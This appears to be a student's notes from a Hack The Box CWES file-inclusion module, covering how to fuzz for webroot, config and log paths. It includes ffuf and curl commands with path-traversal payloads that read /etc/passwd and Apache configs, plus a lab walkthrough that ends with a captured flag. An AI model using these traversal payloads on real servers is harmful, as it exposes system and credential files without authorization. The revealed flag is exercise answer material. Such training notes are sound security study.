---
tags: [CWES, HTB, technical-reference]
module: "File Inclusion"
source_file: "CWES.xmind"
---

# Fuzzing Server Files

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## Server Webroot

### <https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt>

- ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
  - /var/www/html/
  - LFI-Jhaddix.txt wordlist we used earlier, as it also contains various payloads that may reveal the webroot
### <https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt>

## Server Logs/Configurations

### <https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt>

### more precise

- <https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux>
  - ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
- <https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows>
### webroot path

- curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
  - DocumentRoot /var/www/html  
    ErrorLog ${APACHE_LOG_DIR}/error.log  
    CustomLog ${APACHE_LOG_DIR}/access.log combined
- curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
  - export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
- nginx
  - /etc/nginx/sites-enabled/default
## LAB

### Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt

- parameter fuzzing on /index.php
  - ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://154.57.164.65:32714/index.php?FUZZ=value' -fs 2309
    - view
- LFI wordlist on parameter
  - ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.65:32714/index.php?view=FUZZ' -fs 193
    - ../../../../../../../../../../../../../../../../../../../../../etc/passwd
      - http://154.57.164.65:32714/index.php?view=../../../../../../../../../../../../../../../../../../../../../etc/passwd
        - root:x:
- get the flag
  - http://154.57.164.65:32714/index.php?view=../../../../../../../../../../../../../../../../../../../../../flag.txt
    - HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}
